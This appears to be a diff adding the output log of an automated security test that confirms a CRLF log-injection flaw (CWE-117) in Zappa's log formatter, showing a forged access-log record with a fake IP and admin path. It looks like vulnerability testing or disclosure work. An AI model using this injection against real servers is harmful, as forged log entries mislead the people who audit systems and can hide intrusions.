@@ -1,0 +1,10 @@
+==========================================================================
+VULN-007: CRLF/log injection into the Common Log Format
+target : http://localhost:22571
+[INFO] exercising: zappa/utilities.py:1027-1052 format_log <- wsgi.py:129 unquote(path)
+==========================================================================
+[STEP] GET a path containing an encoded CRLF + a forged CLF record (marker PWN_edfb7372)
+[INFO] forged standalone log line: 66.66.66.66 - - [01/Jan/2099:00:00:00 +0000] "GET /admin/PWN_edfb7372 HTTP/1.1" 200 0 "-" "-" HTTP/1.1" 404 207 "" "probe" 0/1418
+[PROOF] an encoded CRLF in the request path produced a separate, fully attacker-authored access-log record (source IP 66.66.66.66, fake 'GET /admin/PWN_edfb7372') in the log stream — Zappa's CLF formatter interpolates the decoded path with no neutralisation.
+[OK] exploit confirmed — CRLF log injection / forged log records
+==> VULN-007: CONFIRMED — CRLF in path forges standalone log entries (CWE-117)
